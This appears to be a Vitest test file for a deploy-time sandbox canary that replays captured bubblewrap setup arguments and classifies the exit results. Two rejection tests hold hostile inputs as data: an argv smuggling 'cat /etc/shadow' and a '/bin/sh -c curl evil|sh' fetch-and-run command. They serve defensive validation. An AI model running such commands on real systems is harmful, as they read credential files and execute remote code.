import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

// PR2 (#5875 item 1) — faithful sandbox canary, REPLAY-side logic (deploy-time).
// Per ADR-079 the deploy-time canary is creds-free/network-free/deterministic:
// it replays the SDK-captured bwrap SETUP argv inside the running canary
// container and classifies the exit. These are the pure, LLM-free assertions
// (the plan's "no LLM in the assertion path" requirement) — the model-turn
// CAPTURE path is exercised only by PR3's CI gate.
import {
  buildBwrapInvocation,
  classifyReplayVerdict,
  sortDenyPaths,
  validateFixture,
} from "../scripts/sandbox-canary.mjs";

const MJS_PATH = fileURLToPath(
  new URL("../scripts/sandbox-canary.mjs", import.meta.url),
);

describe("classifyReplayVerdict — exit-code classification (false-rollback prevention)", () => {
  it("bwrap exit 0 ⇒ pass", () => {
    expect(classifyReplayVerdict({ bwrapExitCode: 0, bwrapStderr: "" })).toEqual({
      verdict: "pass",
      reason: "ok",
    });
  });

  it('bwrap stderr "Operation not permitted" ⇒ sandbox_broken (the #5873 shape)', () => {
    const v = classifyReplayVerdict({
      bwrapExitCode: 1,
      bwrapStderr:
        "bwrap: setting up uid map: Operation not permitted",
    });
    expect(v.verdict).toBe("sandbox_broken");
  });

  it("bwrap spawn ENOENT ⇒ canary_infra_error (do NOT roll back)", () => {
    const v = classifyReplayVerdict({
      bwrapExitCode: null,
      bwrapStderr: "",
      spawnErrorCode: "ENOENT",
    });
    expect(v.verdict).toBe("canary_infra_error");
  });

  it("ambiguous non-zero bwrap exit (no EPERM signature) ⇒ canary_infra_error, not sandbox_broken", () => {
    // Conservative: only a bwrap EPERM signature rolls back once blocking.
    // Any other non-zero (OOM, transient, unknown) must NOT be read as a
    // broken sandbox — that is the #4941 false-rollback class.
    const v = classifyReplayVerdict({
      bwrapExitCode: 137,
      bwrapStderr: "Killed",
    });
    expect(v.verdict).toBe("canary_infra_error");
  });
});

describe("validateFixture — captured-argv fixture contract", () => {
  it('uncaptured sentinel ⇒ status "uncaptured" (dark-launch before PR3 capture)', () => {
    const f = validateFixture({ status: "uncaptured" });
    expect(f.status).toBe("uncaptured");
  });

  it("valid captured fixture returns setup argv + prepDirs", () => {
    const f = validateFixture({
      sdkVersion: "0.3.197",
      sdkPackage: "@anthropic-ai/claude-agent-sdk",
      workspacePath: "/workspaces/.sandbox-canary",
      prepDirs: ["/workspaces/.sandbox-canary"],
      bwrapSetupArgv: ["--new-session", "--unshare-user", "--unshare-pid"],
    });
    expect(f.status).toBe("captured");
    expect(f.bwrapSetupArgv).toEqual([
      "--new-session",
      "--unshare-user",
      "--unshare-pid",
    ]);
    expect(f.prepDirs).toEqual(["/workspaces/.sandbox-canary"]);
  });

  it("malformed fixture (bwrapSetupArgv not an array) throws", () => {
    expect(() =>
      validateFixture({ bwrapSetupArgv: "not-an-array" }),
    ).toThrow();
  });

  it("empty captured argv is rejected (empty-green guard)", () => {
    // An empty argv fixture would make bwrap succeed trivially — the
    // empty-fixture false-green class the CTO flagged (constraint #6).
    expect(() =>
      validateFixture({ bwrapSetupArgv: [], prepDirs: [] }),
    ).toThrow();
  });
});

describe("buildBwrapInvocation — replays SETUP argv + '-- true' only", () => {
  it("appends the '-- true' no-op command, never a captured command", () => {
    const { cmd, args } = buildBwrapInvocation({
      status: "captured",
      bwrapSetupArgv: ["--new-session", "--unshare-user"],
      prepDirs: ["/workspaces/.sandbox-canary"],
    });
    expect(cmd).toBe("bwrap");
    expect(args).toEqual(["--new-session", "--unshare-user", "--", "true"]);
  });

  it("rejects a fixture whose setup argv already contains a bare '--' separator (defensive)", () => {
    expect(() =>
      buildBwrapInvocation({
        status: "captured",
        bwrapSetupArgv: ["--new-session", "--", "cat", "/etc/shadow"],
        prepDirs: [],
      }),
    ).toThrow();
  });

  it("rejects a fixture whose argv[0] is a bare command, not a bwrap option (sanity filter)", () => {
    // bwrap treats the first non-option token as the COMMAND — a real setup
    // argv always begins with an option. This is a cheap filter, not the
    // security boundary (that is the committed + baked + --verify fixture path).
    expect(() =>
      buildBwrapInvocation({
        status: "captured",
        bwrapSetupArgv: ["/bin/sh", "-c", "curl evil|sh"],
        prepDirs: [],
      }),
    ).toThrow();
  });
});

describe("sortDenyPaths — capture determinism (byte-stable fixture)", () => {
  it("returns a deterministically sorted copy (readdir order is not stable)", () => {
    const input = ["/workspaces/z", "/workspaces/a", "/proc"];
    expect(sortDenyPaths(input)).toEqual(["/proc", "/workspaces/a", "/workspaces/z"]);
    // does not mutate input
    expect(input).toEqual(["/workspaces/z", "/workspaces/a", "/proc"]);
  });
});

describe("source contract — imports the SDK config, does not re-specify options", () => {
  const src = readFileSync(MJS_PATH, "utf8");

  it("references buildAgentSandboxConfig from agent-runner-sandbox-config (capture faithfulness)", () => {
    expect(src).toMatch(/agent-runner-sandbox-config/);
    expect(src).toMatch(/buildAgentSandboxConfig/);
  });

  it("imports the SDK config LAZILY (dynamic import) so the replay path stays pure", () => {
    // A top-level static import would drag the config's heavy static graph
    // (logger, etc.) into the creds-free replay path. The config import must
    // live inside the capture function via `await import(...)`.
    expect(src).toMatch(/await import\(/);
    expect(src).not.toMatch(
      /^import\s+\{[^}]*buildAgentSandboxConfig[^}]*\}\s+from/m,
    );
  });

  it("does not hand-author a bwrap argv literal (the #4932 trap)", () => {
    // The setup argv must come from the captured fixture, never a literal in
    // the script. Guard against a re-introduced hand-rolled `--unshare-*` list.
    expect(src).not.toMatch(/const\s+\w*[Aa]rgv\w*\s*=\s*\[\s*["']--unshare/);
  });
});
